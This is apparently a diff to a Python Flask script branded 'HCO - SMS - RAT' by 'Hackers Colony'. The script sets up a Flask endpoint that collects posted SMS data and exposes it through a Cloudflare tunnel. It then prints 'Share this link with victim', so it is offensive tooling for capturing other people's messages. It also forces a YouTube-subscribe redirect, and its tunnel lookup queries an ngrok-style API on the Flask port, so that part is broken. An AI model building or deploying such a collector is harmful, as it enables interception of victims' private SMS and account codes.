@@ -1,45 +1,57 @@
 import os
 import time
-from flask import Flask, request, render_template
+import requests
 import subprocess
+from flask import Flask, request
 
-# Banner with red box and green text
-def banner():
-    print("\033[91m╔════════════════════════════════╗")
-    print("\033[92m║        HCO - SMS - RAT         ║")
-    print("\033[91m╚════════════════════════════════╝\033[0m")
+# ─────────────────────────────────────────────
+# HCO - SMS - RAT | By Hackers Colony
+# ─────────────────────────────────────────────
 
-# Auto YouTube Redirect
-def youtube_redirect():
-    print("\033[93mThis tool is not free. Subscribe to our YouTube channel first...\033[0m")
-    time.sleep(8)
-    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
-    input("\n\033[92mAfter subscribing, press ENTER to continue...\033[0m")
-
-# Start Flask App
 app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('index.html')
 
 @app.route('/sms', methods=['POST'])
 def receive_sms():
-    sms_data = request.form.get("message")
-    print(f"\n\033[96m[SMS RECEIVED]\033[0m {sms_data}")
-    return "SMS Received", 200
+    sms_data = request.form.to_dict()
+    print("\n\033[92m[✓] New SMS Received:\033[0m")
+    for key, value in sms_data.items():
+        print(f"\033[96m{key}:\033[0m {value}")
+    return 'SMS received successfully', 200
 
-def start_cloudflare():
-    os.system("pkill cloudflared > /dev/null 2>&1")
-    print("\n\033[93m[•] Starting Cloudflare tunnel...\033[0m")
-    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(6)
-    os.system("curl -s https://api.ipify.org && echo")
-    print("\n\033[92m[✓] Server & Tunnel running.\n[✓] Share this link with victim:\033[0m")
-    os.system("curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.-]*\.trycloudflare.com'")
+def youtube_redirect():
+    print("\n\033[91mThis tool is not free.\033[0m")
+    print("\033[92mSubscribe to our YouTube channel first...\033[0m")
+    time.sleep(2)
+    print("\n\033[93mRedirecting to YouTube in 8 seconds...\033[0m")
+    time.sleep(8)
+    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
+    time.sleep(2)
 
-if __name__ == '__main__':
-    banner()
+def start_server():
+    print("\n\033[96m[•] Installing requirements...\033[0m")
+    os.system("pip install flask requests > /dev/null 2>&1")
+
+    print("\033[96m[•] Starting Flask server...\033[0m")
+    os.system("nohup flask run --host=0.0.0.0 --port=4040 &")
+
+    print("\033[96m[•] Starting Cloudflare tunnel...\033[0m")
+    os.system("nohup cloudflared tunnel --url http://localhost:4040 > tunnel.log 2>&1 &")
+    time.sleep(5)
+
+    # Get the tunnel URL from Cloudflare API
+    try:
+        response = requests.get("http://127.0.0.1:4040/api/tunnels")
+        tunnels = response.json()["tunnels"]
+        public_url = tunnels[0]["public_url"]
+        print(f"\n\033[92m[✓] Server & Tunnel running.\033[0m")
+        print(f"\033[92m[✓] Share this link with victim:\033[0m \033[1;91m{public_url}/sms\033[0m\n")
+    except:
+        print("\033[91m[!] Failed to get Cloudflare URL. Check if tunnel is running properly.\033[0m")
+
+if __name__ == "__main__":
+    os.system("clear")
+    print("╔════════════════════════════════╗")
+    print("║        HCO - SMS - RAT         ║")
+    print("╚════════════════════════════════╝")
     youtube_redirect()
-    start_cloudflare()
-    app.run(port=5000)
+    start_server()
